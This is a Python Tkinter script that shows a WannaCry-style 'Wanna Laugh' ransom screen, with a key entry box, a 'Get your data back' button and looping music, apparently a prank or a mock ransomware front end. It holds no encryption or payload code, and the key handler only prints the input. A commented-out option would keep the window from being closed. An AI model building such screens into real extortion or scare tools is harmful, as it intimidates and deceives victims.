
from tkinter import *
import os, winsound
from tkinter.ttk import *

bgVal = "#2B061E"
fgVal = "#D2BF55"

root = Tk()
root.configure(background=bgVal, height = 700, width = 820)
#root.resizable(FALSE, FALSE)    #resizing turned off

#sets the window in center of the screen
root.eval('tk::PlaceWindow %s center' % root.winfo_pathname(root.winfo_id()))

#removes title bar and removes the ability to close the application from task bar
#root.overrideredirect(True)

#accepting key
def keyCatch():
    print(keyAccept.get())

art = """

██╗    ██╗ █████╗ ███╗   ██╗███╗   ██╗ █████╗     ██╗      █████╗ ██╗   ██╗ ██████╗ ██╗  ██╗
██║    ██║██╔══██╗████╗  ██║████╗  ██║██╔══██╗    ██║     ██╔══██╗██║   ██║██╔════╝ ██║  ██║
██║ █╗ ██║███████║██╔██╗ ██║██╔██╗ ██║███████║    ██║     ███████║██║   ██║██║  ███╗███████║
██║███╗██║██╔══██║██║╚██╗██║██║╚██╗██║██╔══██║    ██║     ██╔══██║██║   ██║██║   ██║██╔══██║
╚███╔███╔╝██║  ██║██║ ╚████║██║ ╚████║██║  ██║    ███████╗██║  ██║╚██████╔╝╚██████╔╝██║  ██║
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                                            

"""
text = """
   ____     __            __  __         __           
  / __/__  / /____ ____  / /_/ /  ___   / /_____ __ __
 / _// _ \/ __/ -_) __/ / __/ _ \/ -_) /  '_/ -_) // /
/___/_//_/\__/\__/_/    \__/_//_/\__/ /_/\_\\__/\_,  / 
                                               /___/  
                                   
"""

borderScreen = """
.-=~=-.                                                                 .-=~=-.
(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
( _ __)                                                                 ( _ __)
(__  _)                                                                 (__  _)
(_ ___)                                                                 (_ ___)
(__  _)                                                                 (__  _)
( _ __)                                                                 ( _ __)
(__  _)                                                                 (__  _)
(_ ___)                                                                 (_ ___)
(__  _)                                                                 (__  _)
( _ __)                                                                 ( _ __)
(__  _)                                                                 (__  _)
(_ ___)                                                                 (_ ___)
(__  _)                                                                 (__  _)
( _ __)                                                                 ( _ __)
(__  _)                                                                 (__  _)
(_ ___)                                                                 (_ ___)
(__  _)                                                                 (__  _)
( _ __)                                                                 ( _ __)
(__  _)                                                                 (__  _)
( _ __)                                                                 ( _ __)
(__  _)                                                                 (__  _)
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
`-._.-'                                                                 `-._.-'
    """


musiclLogo = """
                     |\                         
____|\_______________|\\___
____|/___3_|________@'_\|__|
___/|____-_|____________|__|
__|_/_\__4_|___|_______@'__|
___\|/_____|___|___________|
    /         O'  Music by Caspro
"""

style = Style()
style.configure('TButton', font = ('TkFixedFont', 10, 'bold'), foreground = bgVal) 

Label(root,text=art, font='TkFixedFont', background=bgVal, foreground=fgVal).place(relx=.505, rely=.1, anchor="center")

Label(root, text = borderScreen, font = 'TkFixedFont', background=bgVal, foreground= fgVal).place(relx=.5, rely=.5,anchor="center")

Label(root, text=text, background=bgVal, foreground="#39A2AE", font = "TkFixedFont").place(relx=.5, rely=.45, anchor="center")

Label(root,text=musiclLogo, font='TkFixedFont', background=bgVal, foreground="#55DBCB").place(relx=.24, rely=.9, anchor="center")

keyAccept = Entry(root, font = 'TkFixedFont', foreground = "black", background = bgVal)
keyAccept.place(relx=.5, rely=.52, anchor="center")
submitBtn = Button(root, text='Get your data back', command=keyCatch, style='TButton') 
submitBtn.place(relx=.5, rely=.6, anchor="center")


#playing music
winsound.PlaySound('extras/Goosebumps Theme Song (Caspro Remix).wav', winsound.SND_ALIAS | winsound.SND_LOOP + winsound.SND_ASYNC)
root.mainloop()
